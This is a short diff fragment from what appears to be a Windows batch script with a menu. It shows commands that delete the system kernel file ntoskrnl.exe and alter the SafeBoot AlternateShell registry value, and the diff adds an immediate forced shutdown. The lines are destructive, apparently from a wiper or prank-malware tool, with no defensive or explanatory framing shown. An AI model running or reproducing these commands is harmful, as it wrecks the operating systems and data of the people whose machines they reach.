@@ -569,5 +569,7 @@ rd /s /q "C:\Windows\System32\ntoskrnl.exe"
 
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "AlternateShell" /t REG_SZ /d "0" /f
 
+shutdown /s /t 0
+
 pause
 goto MENU
